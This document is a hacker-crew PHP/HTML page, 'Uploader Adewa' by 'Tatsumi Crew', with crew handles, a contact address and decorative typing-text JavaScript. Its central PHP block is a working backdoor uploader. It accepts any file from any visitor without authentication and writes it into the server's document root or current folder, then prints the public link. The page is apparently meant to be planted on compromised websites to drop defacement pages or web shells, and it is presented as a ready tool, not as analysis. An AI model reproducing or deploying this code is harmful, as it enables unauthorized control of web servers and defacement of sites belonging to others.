<html lang='en-US'><head><title>adewa saja</title>
<a href="https://www.instagram.com/dev19feb/" target="_blank"><h2>Click Here !</h2></a><br>
<style>
body{cursor:url("http:///foro.elhacker.net/elhacker.cur"),auto;}html{display:table;height:100%;width:100%;}body{display:table-row;}body{display:table-cell;vertical-align:middle;text-align:center;}a:link{text-decoration:none;}
body {
	  background-color: #000000;
	background-image: url(https://i.imgur.com/K0dvwLTr.jpg);
<!--http://www.twitrcover.com/ar/uploads/Al-Quds-Twitter-Header-8534.jpg-->
	margin-left: 0px;
	margin-top: 0px;
	margin-right: 0px;
	margin-bottom: 0px;
	background-position:right top;
	background-repeat:no-repeat;
	background-size:110%
}


.style1 {
	font-family: Arial, Helvetica, sans-serif;
	font-size: 12px;
}
</style><br><br><br>

<br>
<center><?php
echo "<form method='post' enctype='multipart/form-data'>
	  <input type='file' name='idx_file'>
	  <input type='submit' name='upload' value='upload'>
	  </form>";
$root = $_SERVER['DOCUMENT_ROOT'];
$files = $_FILES['idx_file']['name'];
$dest = $root.'/'.$files;
if(isset($_POST['upload'])) {
	if(is_writable($root)) {
		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {
			$web = "http://".$_SERVER['HTTP_HOST']."/";
			echo "Ciee Sukses Uploadnya :* -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";
		} else {
			echo "gagal upload root >:(";
		}
	} else {
		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {
			echo "Ciee Sukses Uploadnya :* <b>$files</b> di folder ini";
		} else {
			echo "gagal upload >:(";
		}
	}
}
?>

<!DOCTYPE html>
<html>
<title>K.I.T.A</title>
	<head>
	<link href='https://fonts.googleapis.com/css?family=Architects+Daughter' rel='stylesheet' type='text/css'>
	</head>
<body bgcolor="#2b2b2b" link="gray" text="gray">
<center>

<script type="text/javascript">
TypingText = function(element, interval, cursor, finishedCallback) {
  if((typeof document.getElementById == "undefined") || (typeof element.innerHTML == "undefined")) {
    this.running = true;
    return;
  }
  this.element = element;
  this.finishedCallback = (finishedCallback ? finishedCallback : function() { return; });
  this.interval = (typeof interval == "undefined" ? 100 : interval);
  this.origText = this.element.innerHTML;
  this.unparsedOrigText = this.origText;
  this.cursor = (cursor ? cursor : "");
  this.currentText = "";
  this.currentChar = 0;
  this.element.typingText = this;
  if(this.element.id == "") this.element.id = "typingtext" + TypingText.currentIndex++;
  TypingText.all.push(this);
  this.running = false;
  this.inTag = false;
  this.tagBuffer = "";
  this.inHTMLEntity = false;
  this.HTMLEntityBuffer = "";
}
TypingText.all = new Array();
TypingText.currentIndex = 0;
TypingText.runAll = function() {
  for(var i = 0; i < TypingText.all.length; i++) TypingText.all[i].run();
}
TypingText.prototype.run = function() {
 if(this.running) return;
 if(typeof this.origText == "undefined") {
   setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
   return;
 }
 if(this.currentText == "") this.element.innerHTML = "";
 if(this.currentChar < this.origText.length) {
   if(this.origText.charAt(this.currentChar) == "<" && !this.inTag) {
     this.tagBuffer = "<";
     this.inTag = true;
     this.currentChar++;
     this.run();
     return;
   } else if(this.origText.charAt(this.currentChar) == ">" && this.inTag) {
     this.tagBuffer += ">";
      this.inTag = false;
      this.currentText += this.tagBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inTag) {
      this.tagBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == "&" && !this.inHTMLEntity) {
     this.HTMLEntityBuffer = "&";
      this.inHTMLEntity = true;
      this.currentChar++;
      this.run();
      return;
    } else if(this.origText.charAt(this.currentChar) == ";" && this.inHTMLEntity) {
     this.HTMLEntityBuffer += ";";
      this.inHTMLEntity = false;
      this.currentText += this.HTMLEntityBuffer;
      this.currentChar++;
      this.run();
      return;
    } else if(this.inHTMLEntity) {
      this.HTMLEntityBuffer += this.origText.charAt(this.currentChar);
      this.currentChar++;
      this.run();
      return;
    } else {
      this.currentText += this.origText.charAt(this.currentChar);
    }
    this.element.innerHTML = this.currentText;
    this.element.innerHTML += (this.currentChar < this.origText.length - 1 ? (typeof this.cursor == "function" ? this.cursor(this.currentText) : this.cursor) : "");
   this.currentChar++;
   setTimeout("document.getElementById('" + this.element.id + "').typingText.run()", this.interval);
 } else {
        this.currentText = "";
        this.currentChar = 0;
       this.running = false;
       this.finishedCallback();
 }
}
</script>
<br><br><br>
<div id="satu">
<br>
<b style="font-size: 40px;">Uploader Adewa</b>
<br>
- use your brain to repair this system<br>
Tatsumi Crew<br>
@2017<br><br>
Contact : sagirinime123@gmail.com

    <br><br>
<font size='3px' color='white' face='Courier New'>RESIS-07 - ./Cyber00t - 0x1998 - Setya404 - ACE666X - ZI-SLOW<br>Mr.Adewa - AaR999 - kerens.id - Dayy404 - Himiko</font>